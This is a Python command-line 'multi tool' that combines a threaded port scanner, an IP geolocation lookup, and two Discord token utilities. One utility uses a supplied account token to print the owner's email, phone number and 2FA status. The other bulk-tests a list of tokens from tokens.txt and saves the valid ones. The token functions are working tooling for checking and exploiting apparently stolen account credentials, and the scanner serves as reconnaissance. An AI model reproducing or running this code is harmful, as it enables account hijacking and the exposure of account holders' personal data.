import sys
import ctypes
import requests
import time
import threading
import socket
import concurrent.futures
from os import system, name
from random import randint
from colorama import Fore
cummands = ['1','2','3','4','clear','cls','logout','exit','quit']

def shitass_clear():
	if name == 'nt':
		_ = system('cls')
	else:
		_ = system('clear')

def shitass_exit():
	sys.exit("   ╠═[X] EXITING > GOODBYE.")

def shitass_main():
	global newprompt
	newprompt = True
	ctypes.windll.kernel32.SetConsoleTitleW(
		f'Shitass Multi Tool | By bong#5107')
	print('')
	print('')
	shitass_clear()
	print(f'''\n



				███████╗██╗  ██╗██╗████████╗ █████╗ ███████╗███████╗
				██╔════╝██║  ██║██║╚══██╔══╝██╔══██╗██╔════╝██╔════╝
				███████╗███████║██║   ██║   ███████║███████╗███████╗
				╚════██║██╔══██║██║   ██║   ██╔══██║╚════██║╚════██║
				███████║██║  ██║██║   ██║   ██║  ██║███████║███████║
				╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
																													                                               
		═════════════════════════════════════════════════════════════════════════════════════
		 [{Fore.BLUE}1{Fore.RESET}] PORT SCANNER | [{Fore.RED}2{Fore.RESET}] IP/DOMAIN CHECKER | [{Fore.BLUE}3{Fore.RESET}] TOKEN INFO | [{Fore.RED}4{Fore.RESET}] MULTI TOKEN CHECKER
		═════════════════════════════════════════════════════════════════════════════════════''')



def pscan(ipaddress, port, threads):
	print_lock = threading.Lock()

	def scan(ipaddress, port):
		scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		scanner.settimeout(1)
		try:
			scanner.connect((ipaddress, port))
			scanner.close()
			with print_lock:
				print()
				print(f'[{Fore.WHITE}{port}{Fore.RESET}]' + f'{Fore.GREEN}OPEN{Fore.RESET}')
		except:
			pass

	with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as executor:
		for port in range(int(port)):
			executor.submit(scan, ipaddress, port + 1)




	


def ip(ipaddress):
	shitass_main()
	URL = f'http://ip-api.com/json/{ipaddress}?fields=query,status,continent,country,regionName,city,district,zip,lat,lon,isp,org,as,reverse,mobile,proxy,hosting'

	r = requests.get(url = URL)
	data = r.json()
	status = data['status']
	if(status == 'fail'):
		input(f'{Fore.RED}REQUEST FAILED{Fore.RESET}')
	else:
		query = data['query']
		continent = data['continent']
		country = data['country']
		region = data['regionName']
		city = data['city']
		zipp = data['zip']
		lat = data['lat']
		lon = data['lon']
		isp = data['isp']
		org = data['org']
		asn = data['as']
		mobile = data['mobile']
		proxy = data['proxy']
		hosting = data['hosting']

		print(f'''
		[{Fore.BLUE}IP:{Fore.RESET}]                     {query}
		[{Fore.BLUE}CONTINENT:{Fore.RESET}]              {continent}		
		[{Fore.BLUE}COUNTRY:{Fore.RESET}]		  {country}
		[{Fore.BLUE}REGION:{Fore.RESET}]		  {region}
		[{Fore.BLUE}CITY:{Fore.RESET}]			  {city}
		[{Fore.BLUE}ZIP:{Fore.RESET}]			  {zipp}
		[{Fore.BLUE}LATITUDE:{Fore.RESET}]		  {lat}
		[{Fore.BLUE}LONGITUDE:{Fore.RESET}]		  {lon}
		[{Fore.BLUE}ISP:{Fore.RESET}]		          {isp} 
		[{Fore.BLUE}ORGINIZATION:{Fore.RESET}]	          {org} 	
		[{Fore.BLUE}AS:{Fore.RESET}]		          {asn}     
		[{Fore.BLUE}MOBILE?:{Fore.RESET}]		  {mobile} 
		[{Fore.BLUE}PROXY?:{Fore.RESET}]		  {proxy} 
		[{Fore.BLUE}HOSTING?:{Fore.RESET}]		  {hosting} 


		''')

def tokenInfo(token):
	shitass_main()
	headers = {'Authorization': token, 'Content-Type': 'application/json'}
	r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
	if r.status_code == 200:
			userName = r.json()['username'] + '#' + r.json()['discriminator']
			userID = r.json()['id']
			phone = r.json()['phone']
			email = r.json()['email']
			mfa = r.json()['mfa_enabled']
			if(mfa == 'false'):
				mf = 'Disabled'
			else:
				mf = 'Enabled'
			print(f'''
			[{Fore.BLUE}USERNAME:{Fore.RESET}]        {userName}
			[{Fore.BLUE}USERID:{Fore.RESET}]          {userID}
			[{Fore.BLUE}2FA:{Fore.RESET}]             {mf}
			[{Fore.BLUE}EMAIL:{Fore.RESET}]           {email}
			[{Fore.BLUE}PHONE NUMBER:{Fore.RESET}]    {phone}
			[{Fore.BLUE}TOKEN:{Fore.RESET}]           {token}

			''')
	else:
		print(f'{Fore.RED}{token} IS INVALID{Fore.RESET}')

def tokenCheck():
	shitass_main()
	input(f"[{Fore.GREEN}!{Fore.RESET}] PROGRAM WILL {Fore.RED}BREAK{Fore.RESET} WITHOUT A {Fore.GREEN}TOKENS.TXT{Fore.RESET}")
	checked = []
	with open('tokens.txt', 'r') as f:
		for line in f:
			time.sleep(0)
			token = line.rstrip("\n")
			headers = {
				'Authorization': f'{token}'  
			}
			src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
			try:
				if src.status_code == 200:
					print(f"[{Fore.GREEN}VALID TOKEN{Fore.RESET}] > " + token)
					checked.append(token)
				else:
					print(f"[{Fore.RED}INVALID TOKEN{Fore.RESET}] > " + token)
			except Exception:
				print (f"TOKEN-CHECKER [{Fore.RED}FAILED{Fore.RESET}] | CHECK INTERNET CONNECTIVITY, OR TRY AGAIN LATER")
	if len(checked) > 0:
		save = input(f'{Fore.GREEN}{len(checked)} VALID TOKENS{Fore.RESET}\nSAVE TOKENS TO FILE? (Y/N)')
		if save == 'y':
			balls = randint(1,999)
			name = f'VALID_TOKENS{balls}'
			with open(f'{name}.txt', 'w') as saveFile:
				saveFile.write('\n'.join(checked))
			print(f'SAVED TOKENS TO {name}')
		


def cmds():
	global newprompt
	if newprompt:
		newprompt = False
		command = input(
			f"   ╔════════════[{Fore.BLUE}<>{Fore.RESET}]\n   ╚═══>{Fore.RED}Shitass{Fore.RESET}@bignuts {Fore.BLUE}-{Fore.RESET} ")
	else:
		command = input(
			f"   ╠════════════[{Fore.BLUE}<>{Fore.RESET}]\n   ╚═══>{Fore.RED}Shitass{Fore.RESET}@bignuts {Fore.BLUE}-{Fore.RESET} ")
	if command not in cummands:
		print(
			f"   ╠═[{Fore.BLUE}X{Fore.RESET}] {Fore.RED}Invalid{Fore.RESET} Option")
		cmds()
	if command == "1":
		print(f'[{Fore.BLUE}>{Fore.RESET}] ENTER IP/DOMAIN', end=''); ipaddress = input('  :  ')
		print(f'[{Fore.BLUE}>{Fore.RESET}] ENTER PORT RANGE EX: 1000', end=''); port = input('  :  ')
		print(f'[{Fore.BLUE}>{Fore.RESET}] ENTER THREAD COUNT', end=''); threads = input('  :  ')
		pscan(ipaddress, port, threads)
	elif command == "2":
		print(f'[{Fore.BLUE}>{Fore.RESET}] ENTER IP/DOMAIN', end=''); ipaddress = input('  :  ')
		ip(ipaddress)
	elif command == "3":
		print(f'[{Fore.BLUE}>{Fore.RESET}] ENTER ACCOUNT TOKEN', end=''); token = input('  :  ')
		tokenInfo(token)
	elif command == "4":
		tokenCheck()
	elif command == "clear":
		shitass_main()
	elif command == "cls":
		shitass_main()
	elif command == "exit":
		shitass_exit()
	elif command == "quit":
		shitass_exit()
	elif command == "logout":
		shitass_exit()


shitass_main()
while True:
	try:
		cmds()
	except KeyboardInterrupt:
		pass
		print('')
		
